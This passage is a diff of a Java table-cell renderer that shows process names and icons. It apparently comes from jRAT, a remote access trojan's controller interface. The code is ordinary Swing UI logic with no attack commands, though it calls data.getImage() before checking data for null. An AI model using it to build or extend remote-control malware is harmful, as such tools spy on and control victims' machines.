@@ -10,26 +10,39 @@ import javax.swing.Icon;
 import javax.swing.JLabel;
 import javax.swing.JTable;
 
+import se.jrat.common.ProcessData;
+
 import com.redpois0n.oslib.OperatingSystem;
 
 
 @SuppressWarnings("serial")
 public class ProcessTableRenderer extends DefaultJTableCellRenderer {
-
-	public static final Icon EXE_ICON = FileIconUtils.getIconFromExtension(".exe");
-	public static final Icon PROCESS_ICON = IconUtils.getIcon("process-go");
+	
+	public static final Icon ICON_DEFAULT;
+	
+	static {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
+			ICON_DEFAULT = FileIconUtils.getIconFromExtension(".exe");
+		} else {
+			ICON_DEFAULT = IconUtils.getIcon("process-go");
+		}
+	}
 	
 	public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
 		JLabel label = (JLabel) super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
 
-		if (column == 0) {
-			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
-				label.setIcon(EXE_ICON);
-			} else {
-				label.setIcon(PROCESS_ICON);
-			}
+		ProcessData data = (ProcessData) table.getValueAt(row, column);
+		
+		if (column == 0 && data.getImage() != null) {
+			label.setIcon(data.getIcon());
+		} else if (column == 0) {
+			label.setIcon(ICON_DEFAULT);
 		} else {
 			label.setIcon(null);
+		}
+		
+		if (data != null && data.getData() != null && column < data.getData().length) {
+			label.setText(data.getData()[column]);
 		}
 		
 		if (column == 3) {
